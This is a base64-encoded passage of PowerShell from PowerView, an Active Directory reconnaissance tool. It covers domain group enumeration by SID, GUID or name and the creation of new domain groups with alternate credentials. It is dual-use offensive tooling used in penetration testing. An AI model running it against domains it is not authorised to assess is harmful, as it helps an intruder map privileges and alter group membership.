AgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRHcm91cFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydNZW1iZXJJZGVudGl0eSddKSB7CgogICAgICAgICAgICAgICAgaWYgKCRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICAgICAgICAgJE9sZFByb3BlcnRpZXMgPSAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRNZW1iZXJJZGVudGl0eQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRUcnVlCgogICAgICAgICAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRoZSB1c2VyL2dyb3VwIHRvIGEgZGlyZWN0b3J5IGVudHJ5CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdERpcmVjdG9yeUVudHJ5ID0gJF8uR2V0RGlyZWN0b3J5RW50cnkoKQoKICAgICAgICAgICAgICAgICAgICAjIGNhdXNlIHRoZSBjYWNoZSB0byBjYWxjdWxhdGUgdGhlIHRva2VuIGdyb3VwcyBmb3IgdGhlIHVzZXIvZ3JvdXAKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RGlyZWN0b3J5RW50cnkuUmVmcmVzaENhY2hlKCd0b2tlbkdyb3VwcycpCgogICAgICAgICAgICAgICAgICAgICRPYmplY3REaXJlY3RvcnlFbnRyeS5Ub2tlbkdyb3VwcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRoZSB0b2tlbiBncm91cCBzaWQKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2lkID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJF8sMCkpLlZhbHVlCgogICAgICAgICAgICAgICAgICAgICAgICAjIGlnbm9yZSB0aGUgYnVpbHQgaW4gZ3JvdXBzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBTaWQgLW5vdG1hdGNoICdeUy0xLTUtMzItLionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkR3JvdXBTaWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkT2xkUHJvcGVydGllcykgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRPbGRQcm9wZXJ0aWVzIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cCA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Hcm91cCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtJykgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJlcGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBEb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICRJZGVudGl0eUluc3RhbmNlLlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRHcm91cERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIofChzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQWRtaW5Db3VudCddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBhZG1pbkNvdW50PTEnCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKGFkbWluY291bnQ9MSknCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydHcm91cFNjb3BlJ10pIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBTY29wZVZhbHVlID0gJFBTQm91bmRQYXJhbWV0ZXJzWydHcm91cFNjb3BlJ10KICAgICAgICAgICAgICAgICAgICAkRmlsdGVyID0gU3dpdGNoICgkR3JvdXBTY29wZVZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICdEb21haW5Mb2NhbCcgICAgICAgeyAnKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00KScgfQogICAgICAgICAgICAgICAgICAgICAgICAnTm90RG9tYWluTG9jYWwnICAgIHsgJyghKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00KSknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ0dsb2JhbCcgICAgICAgICAgICB7ICcoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICdOb3RHbG9iYWwnICAgICAgICAgeyAnKCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpKScgfQogICAgICAgICAgICAgICAgICAgICAgICAnVW5pdmVyc2FsJyAgICAgICAgIHsgJyhncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9OCknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ05vdFVuaXZlcnNhbCcgICAgICB7ICcoIShncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9OCkpJyB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIFNlYXJjaGluZyBmb3IgZ3JvdXAgc2NvcGUgJyRHcm91cFNjb3BlVmFsdWUnIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snR3JvdXBQcm9wZXJ0eSddKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwUHJvcGVydHlWYWx1ZSA9ICRQU0JvdW5kUGFyYW1ldGVyc1snR3JvdXBQcm9wZXJ0eSddCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciA9IFN3aXRjaCAoJEdyb3VwUHJvcGVydHlWYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAnU2VjdXJpdHknICAgICAgICAgICAgICB7ICcoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpJyB9CiAgICAgICAgICAgICAgICAgICAgICAgICdEaXN0cmlidXRpb24nICAgICAgICAgIHsgJyghKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KSknIH0KICAgICAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZWRCeVN5c3RlbScgICAgICAgeyAnKGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xKScgfQogICAgICAgICAgICAgICAgICAgICAgICAnTm90Q3JlYXRlZEJ5U3lzdGVtJyAgICB7ICcoIShncm91cFR5cGU6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MSkpJyB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIFNlYXJjaGluZyBmb3IgZ3JvdXAgcHJvcGVydHkgJyRHcm91cFByb3BlcnR5VmFsdWUnIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PWdyb3VwKSRGaWx0ZXIpIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogJCgkR3JvdXBTZWFyY2hlci5maWx0ZXIpIgoKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRHcm91cFNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkR3JvdXBTZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwID0gJF8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cCA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Hcm91cCcpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIE5ldy1Eb21haW5Hcm91cCB7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIG5ldyBkb21haW4gZ3JvdXAgKGFzc3VtaW5nIGFwcHJvcHJpYXRlIHBlcm1pc3Npb25zKSBhbmQgcmV0dXJucyB0aGUgZ3JvdXAgb2JqZWN0LgoKVE9ETzogaW1wbGVtZW50IGFsbCBwcm9wZXJ0aWVzIHRoYXQgTmV3LUFER3JvdXAgaW1wbGVtZW50cyAoaHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9lZTYxNzI1My5hc3B4KS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2lmaWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIGNyZWF0ZSBhIG5ldwpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbCB3aXRoIHRoZSBzcGVjaWZpZWQKZ3JvdXAgcHJvcGVydGllcy4KCi5QQVJBTUVURVIgU2FtQWNjb3VudE5hbWUKClNwZWNpZmllcyB0aGUgU2VjdXJpdHkgQWNjb3VudCBNYW5hZ2VyIChTQU0pIGFjY291bnQgbmFtZSBvZiB0aGUgZ3JvdXAgdG8gY3JlYXRlLgpNYXhpbXVtIG9mIDI1NiBjaGFyYWN0ZXJzLiBNYW5kYXRvcnkuCgouUEFSQU1FVEVSIE5hbWUKClNwZWNpZmllcyB0aGUgbmFtZSBvZiB0aGUgZ3JvdXAgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEaXNwbGF5TmFtZQoKU3BlY2lmaWVzIHRoZSBkaXNwbGF5IG5hbWUgb2YgdGhlIGdyb3VwIHRvIGNyZWF0ZS4gSWYgbm90IHByb3ZpZGVkLCBkZWZhdWx0cyB0byBTYW1BY2NvdW50TmFtZS4KCi5QQVJBTUVURVIgRGVzY3JpcHRpb24KClNwZWNpZmllcyB0aGUgZGVzY3JpcHRpb24gb2YgdGhlIGdyb3VwIHRvIGNyZWF0ZS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgdG8gc2VhcmNoIGZvciB1c2VyL2dyb3VwIHByaW5jaXBhbHMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpOZXctRG9tYWluR3JvdXAgLVNhbUFjY291bnROYW1lIFRlc3RHcm91cCAtRGVzY3JpcHRpb24gJ1RoaXMgaXMgYSB0ZXN0IGdyb3VwLicKCkNyZWF0ZXMgdGhlICdUZXN0R3JvdXAnIGdyb3VwIHdpdGggdGhlIHNwZWNpZmllZCBkZXNjcmlwdGlvbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpOZXctRG9tYWluR3JvdXAgLVNhbUFjY291bnROYW1lIFRlc3RHcm91cCAtRGVzY3JpcHRpb24gJ1RoaXMgaXMgYSB0ZXN0IGdyb3VwLicgLUNyZWRlbnRpYWwgJENyZWQKCkNyZWF0ZXMgdGhlICdUZXN0R3JvdXAnIGdyb3VwIHdpdGggdGhlIHNwZWNpZmllZCBkZXNjcmlwdGlvbiB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbAojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTGVuZ3RoKDAsIDI1NildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREaXNwbGF5TmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREZXNjcmlwdGlvbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgICRDb250ZXh0QXJndW1lbnRzID0gQHsKICAgICAgICAnSWRlbnRpdHknID0gJFNhbUFjY291bnROYW1lCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgJENvbnRleHQgPSBHZXQtUHJpbmNpcGFsQ29udGV4dCBAQ29udGV4dEFyZ3VtZW50cwoKICAgIGlmICgkQ29udGV4dCkgewogICAgICAgICRHcm91cCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbCAtQXJndW1lbnRMaXN0ICgkQ29udGV4dC5Db250ZXh0KQoKICAgICAgICAjIHNldCBhbGwgdGhlIGFwcHJvcHJpYXRlIGdyb3VwIHBhcmFtZXRlcnMKICAgICAg